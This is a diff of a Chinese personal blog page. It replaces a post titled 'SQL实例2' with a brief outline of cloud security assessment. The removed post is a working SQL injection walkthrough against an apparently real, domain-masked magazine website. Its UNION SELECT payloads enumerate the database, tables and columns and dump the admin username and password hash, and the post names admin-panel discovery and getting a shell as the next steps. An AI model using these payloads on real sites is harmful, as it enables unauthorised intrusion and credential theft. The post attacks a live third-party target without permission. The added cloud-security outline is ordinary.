@@ -17,7 +17,7 @@
 <!--<![endif]-->
 
 <head>
-  <title>SQL实例2 | 大棟哥の博客</title>
+  <title>云安全 | 大棟哥の博客</title>
   <!-- Meta data -->
     <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
@@ -269,41 +269,41 @@
         <div class="row col-md-offset-2">
             <div class="col-md-8">
     			<span class="post-meta">
-      <time datetime="2016-07-11T13:11:00.000Z" itemprop="datePublished">
-          2016-07-11
+      <time datetime="2016-08-20T01:16:51.000Z" itemprop="datePublished">
+          2016-08-20
       </time>
     
     
     | 
-    <a href='/tags/SQL-inject/'>SQL inject</a>
+    <a href='/tags/article/'>article</a>
     
     
 </span>
-                <h1>SQL实例2</h1>
+                <h1>云安全</h1>
             </div>
         </div>
         <div class="col-md-8 col-md-offset-2">
-      		<p>0x00.【原理】<br>SQL（结果化查询语言）是一种用户和数据库交互的文本语言，SQL注入就是利用某些数据库某些外部接口把用户输入的数据插入到数据库中进行操作，从而达到入侵数据库的目的。产生的主要原因是没有对用户输入的数据进行过滤，导致非法数据的提交！<br>0x01.【步骤】<br>1、判断web环境是否可以SQL注入：如果URL仅仅对网页访问就不存在SQL注入；只有对数据库进行动态查询才有可能存在SQL注入；<br>2、测试注入点：对于GET类型的，可以在URL中输入特殊字符来进行判断；通过浏览器插件进行测试；通过burpsuit抓包进行测试；<br>3、猜解用户名和密码：可以通过构造payload进行库、表、字段、内容的猜解，也可以通过工具进行跑用户名和密码；<br>4、查找后台：后台管理员界面一般不想普通用户开放，可以根据自己的经验进行后台的路径的尝试，后者使用工具进行批量的扫描；<br>5、getshell:进入管理员后台之后，获取shell查看权限，低权限的话要进行提权，最终实现控制服务器。<br>0x02.【目标】<br>澳门某精品杂志<br>目标站点：<a href="http://www.XXXXXXXX.com/" target="_blank" rel="external">http://www.XXXXXXXX.com/</a><br>注入点：<a href="http://www.XXXXXXX.com/cn/Consultingin.php?id=716" target="_blank" rel="external">http://www.XXXXXXX.com/cn/Consultingin.php?id=716</a><br>注入类型：UNION query<br>0x03.【步骤】<br>a)确定目标网站，进行信息收集；<br>b)寻找注入点；<br>c)构造payload爆出数据库、表、字段，拿到用户名和密码；<br>d)查找后台；<br>e)获取getshell<br>0x04.【流程】<br>注：本次试验只对目标网站进行sql注入测试！<br>1、对目标进行测试：<br>payload：<a href="http://www.XXXXXXX.com/cn/Consultingin.php?id=716’" target="_blank" rel="external">http://www.XXXXXXX.com/cn/Consultingin.php?id=716’</a><br>出现如下报错信息，可能存在注入：<br>Unknown column ‘716’’ in ‘where clause’<br>2、猜解字段，经过测试有18个字段：<br>payload：?id=716 order by 19时出现如下报错信息<br>Unknown column ‘19’ in ‘order clause’<br>payload：?id=716 order by 18 显示正常<br>说明有18个字段<br>3、查找一下显示位，发现有三个显示位：<br>payload：id=-716 UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18<br>发现2,9,18三个地方为显示位，如下图：<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sql%E5%AE%9E%E4%BE%8B2/%E5%9B%BE%E7%89%871.png?raw=true" alt="image"><br>4、看一下基本信息：<br>payload：<a href="http://www.XXXXXXX.com/cn/Consultingin.php?id=-716" target="_blank" rel="external">http://www.XXXXXXX.com/cn/Consultingin.php?id=-716</a> UNION     SELECT 1,database(),3,4,5,6,7,8,user(),10,11,12,13,14,15,16,17,version()<br>查看一下数据库版本号、当前数据库、当前用户<br><img src="https://github.com/scorpoin/scorpoin.github.io/blob/master/archives/sql%E5%AE%9E%E4%BE%8B2/%E5%9B%BE%E7%89%872.png?raw=true" alt="image"><br>5、构造payload查看数据库，有两个库：<br>payload：<a href="http://www.XXXXXXX.com/cn/Consultingin.php?id=-716" target="_blank" rel="external">http://www.XXXXXXX.com/cn/Consultingin.php?id=-716</a> UNION     SELECT1,group_concat(distinct+table_schema),3,4,5,6,7,8,user(),10,11,12,13,14,    15,16,17,version()+from+information_schema.tables<br>爆出两个数据库：<br>information_schema、hotel93<br>6、看一下hotel93库里边的表：<br>payload：<a href="http://www.XXXXXXXX.com/cn/Consultingin.php" target="_blank" rel="external">http://www.XXXXXXXX.com/cn/Consultingin.php</a><br>?id=-716 UNION SELECT         1,group_concat(distinct+table_name),3,4,5,6,7,8,user(),10,11,12,13,14,15,16,17,    version()+from+information_schema.tables+where+Table_ScheMa=0x686f74656    c3933<br>表名如下：<br>wd_admin_user,wd_cate,wd_category,wd_dl_file,wd_dy,wd_hy_jx,wd_hy_sm,wd_hy_xinshu,wd_hybm,wd_hycon,wd_hycs,wd_hymoney,wd_hyry,wd_hysf,wd_image,wd_info,wd_message,wd_news,wd_pro<br>7、看一个wd_admin_user表下字段：<br>payload：<a href="http://www.XXXXXXXXX.com/cn/Consultingin.php" target="_blank" rel="external">http://www.XXXXXXXXX.com/cn/Consultingin.php</a><br>?id=-716 UNION SELECT     1,group_concat(column_name),3,4,5,6,7,8,user(),10,11,12,13,14,15,16,17,versio    n()+from+information_schema.columns+where+Table_ScheMa=0x686f74656c39    33+and+table_name=0x77645f61646d696e5f75736572<br>有三个字段：<br>id、username、pwd</p>
-<p>8、越来越近结果了，看一下用户名和密码字段里边的内容：<br>payload：<a href="http://www.XXXXXXXXX.com/cn/Consultingin.php" target="_blank" rel="external">http://www.XXXXXXXXX.com/cn/Consultingin.php</a><br>?id=-716 UNION SELECT     1,group_concat(username,pwd,0x7c7c),3,4,5,6,7,8,user(),10,11,12,13,14,15,16,    17,version()+from+wd_admin_user<br>最终结果：<br>admin21232f297axxxxxx3894a0e4a801fc3||<br>接下来就是找后台、、、好了，友情测试到此结束！<br>0x05.【总结】<br>sql注入危害很大，代码要对输入的数据进行过滤，错误信息要尽量少，注入的时候构造payload是很重要的！<br>——EOF——</p>
+      		<p><img src="\云安全\10.jpg" alt="image"><br>    随着企业云进程的加速，云安全也成为了企业安全的重中之重，了解和学习前沿的安全技术也变得尤为重要，如机器学习、威胁情报、预测分析可以将威胁响应提升到一个全新的高度！<br>云安全评估：<br>从以下几个方面来考虑：</p>
+<h3 id="1、资产价值；"><a href="#1、资产价值；" class="headerlink" title="1、资产价值；"></a>1、资产价值；</h3><p>对于云安全业务，我们需要了解该业务的核心价值所在，不同价值的数据会导致不同的安全威胁，高价值的资产引入将提高云的风险！</p>
+<h3 id="2、安全风险"><a href="#2、安全风险" class="headerlink" title="2、安全风险"></a>2、安全风险</h3><p>要分析我们所能承受的风险，例如拒绝服务DOS，用户数据被非法访问，对内部网络的渗透；</p>
+<h3 id="3、威胁建模"><a href="#3、威胁建模" class="headerlink" title="3、威胁建模"></a>3、威胁建模</h3><p>根据云可能承受的风险以及造成的风险的途径，重点在于分析系统的体系结构，安全域以及各安全域的边界，并且建立威胁模型，在paas云平台上和internet的边界上需要考虑的 包括外网的网络攻击，恶意扫描<br>对于用户数据和平台数据边界间应该考虑恶意代码对平台数据，甚至因为paas多用户的特殊性，应该考虑用户数据间的边界问题，在此之外还要考虑平台之外对内部数据中心的影响；</p>
+<h3 id="4、安全策略"><a href="#4、安全策略" class="headerlink" title="4、安全策略"></a>4、安全策略</h3><p>基于上述的威胁建模，我们可以针对各种不同的威胁进行必要的安全的策略以杜绝和弱化风险，例如paas云边界上部署防火墙，在平台和内部网络之间部署入侵检测及监控系统<br>对于平台和用户以及用户之间要求做到安全隔离、、、</p>
+<h3 id="5、技术控制"><a href="#5、技术控制" class="headerlink" title="5、技术控制"></a>5、技术控制</h3><p>安全基线，访问控制，异常监控通过本地网络，</p>
 
             <div class="clearfix"></div>
             <hr class="nogutter">
         </div>
         <nav class="pagination" role="pagination">
     
-    <a class="pull-left" href="/2016/07/17/GOOGLE-HACKING/" style="float: left;">
-        ← GOOGLE HACKING
-    </a>
     
-    
-    <a class="pull-right" href="/2016/07/10/SQL实例1/">
-        SQL实例1 →
+    <a class="pull-right" href="/2016/08/18/B-S-and-C-S/">
+        B/S and C/S →
     </a>
     
 </nav>
 
         <div class="duoshuo">
-<div class="ds-thread" data-thread-key="2016/07/11/SQL实例2/" data-title="SQL实例2" data-url="http://www.jiadong.xin/2016/07/11/SQL实例2/"></div>
+<div class="ds-thread" data-thread-key="2016/08/20/云安全/" data-title="云安全" data-url="http://www.jiadong.xin/2016/08/20/云安全/"></div>
 <script type="text/javascript">
 var duoshuoQuery = {short_name:"dadongge"};
 (function() {
